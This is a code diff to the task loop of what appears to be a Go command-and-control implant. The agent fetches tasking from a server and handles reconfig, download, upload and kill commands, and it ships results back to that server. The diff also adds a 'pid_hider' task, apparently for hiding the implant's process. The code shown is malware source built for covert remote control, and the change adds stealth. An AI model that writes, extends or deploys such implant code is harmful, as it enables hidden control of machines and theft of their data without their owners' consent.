@@ -12,7 +12,7 @@ import (
 	"time"
 )
 
-func ParseTasks(serverUrl string, tasking string) (string, error) {
+func ParseTasks(tasking string) (string, error) {
 
 	var tasks []map[string]interface{}
 	err := json.Unmarshal([]byte(tasking), &tasks)
@@ -21,13 +21,13 @@ func ParseTasks(serverUrl string, tasking string) (string, error) {
 	}
 
 	for _, taskData := range tasks {
-		url := fmt.Sprintf("%s/results/%s", serverUrl, taskData["session"])
-		TaskHandler(taskData, url, serverUrl)
+		url := fmt.Sprintf("%s/results/%s", agent_config.ServerUrl, taskData["session"])
+		TaskHandler(taskData, url)
 	}
 	return "", nil
 }
 
-func TaskHandler(taskData map[string]interface{}, url string, serverUrl string) {
+func TaskHandler(taskData map[string]interface{}, url string) {
 	if debug.Debug {
 		fmt.Printf("[*] Task Recv: %s\n", taskData["task"])
 	}
@@ -45,13 +45,17 @@ func TaskHandler(taskData map[string]interface{}, url string, serverUrl string) 
 	case "reconfig":
 		agent_helper.ReconfigHandler(url, taskData)
 	case "kill":
-		agent_helper.SendDeathMessage(serverUrl, taskData["session"].(string))
+		agent_helper.SendDeathMessage(agent_config.ServerUrl, taskData["session"].(string))
 		agent_helper.DataShipper(url, taskData, "true")
 		agent_helper.TerminateImplant()
 	case "download":
 		agent_helper.DownloadHandler(url, taskData)
 	case "upload":
 		agent_helper.UploadHandler(url, taskData)
+	case "pid_hider":
+		agent_helper.PidHiderHandler(url, taskData)
+	default:
+		agent_helper.DataShipper(url, taskData, "unknown task")
 	}
 }
 
@@ -94,7 +98,7 @@ func main() {
 			tasking, err := agent_helper.FetchTasking(agent_config.ServerUrl, initialInfo.Session)
 			if err != nil {
 			} else {
-				ParseTasks(agent_config.ServerUrl, tasking)
+				ParseTasks(tasking)
 			}
 			continue
 		}
